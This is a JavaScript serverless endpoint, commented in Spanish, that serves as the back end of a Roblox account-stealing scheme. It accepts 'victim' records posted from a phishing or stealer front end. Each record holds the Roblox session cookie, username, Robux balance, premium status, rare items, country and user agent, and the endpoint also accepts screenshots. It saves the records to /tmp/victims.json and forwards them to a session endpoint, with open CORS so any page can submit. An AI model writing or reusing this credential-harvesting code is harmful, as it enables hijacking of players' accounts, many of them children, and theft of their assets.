// api/log.js - VERSIÓN FINAL CON SESSION
import fs from 'fs';

const DB_PATH = '/tmp/victims.json';

export default async function handler(req, res) {
    // Configurar CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        return res.status(204).end();
    }

    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const data = req.body;
    const baseUrl = `https://${req.headers.host}`;

    // ============================================
    // MANEJAR CAPTURA DE PANTALLA
    // ============================================
    if (data.type === 'screenshot') {
        try {
            const base64Data = data.image.split(',')[1];
            const buffer = Buffer.from(base64Data, 'base64');
            
            // Aquí podrías guardar la imagen o enviarla a algún lado
            // Por ahora solo respondemos ok
        } catch {}
        return res.status(200).json({ status: 'ok' });
    }

    // ============================================
    // MANEJAR LIMPIEZA
    // ============================================
    if (data.type === 'cleanup') {
        return res.status(200).json({ status: 'ok' });
    }

    // ============================================
    // PROCESAR DATOS DE LA VÍCTIMA
    // ============================================
    const userId = data.roblox?.userId || `anon_${Date.now()}`;

    const victimData = {
        roblox: {
            username: data.roblox?.username || 'No disponible',
            userId: data.roblox?.userId || 'No disponible',
            robux: data.roblox?.robux || 0,
            seguidores: data.roblox?.seguidores || 0,
            amigos: data.roblox?.amigos || 0,
            premium: data.roblox?.premium || 'No',
            verified: data.roblox?.verified || 'No',
            headless: data.roblox?.headless || 'No',
            korblox: data.roblox?.korblox || 'No'
        },
        cookie: data.cookie || 'No disponible',
        pais: data.pais || 'Desconocido',
        fecha: data.fecha || '',
        hora: data.hora || '',
        userAgent: data.userAgent || ''
    };

    // ============================================
    // GUARDAR EN /tmp
    // ============================================
    try {
        let victims = {};
        if (fs.existsSync(DB_PATH)) {
            victims = JSON.parse(fs.readFileSync(DB_PATH, 'utf8'));
        }
        victims[userId] = victimData;
        fs.writeFileSync(DB_PATH, JSON.stringify(victims));
    } catch {}

    // ============================================
    // ENVIAR A SESSION
    // ============================================
    try {
        await fetch(`${baseUrl}/api/session`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ userId, victimData })
        });
    } catch {}

    res.status(200).json({ status: 'ok', userId });
}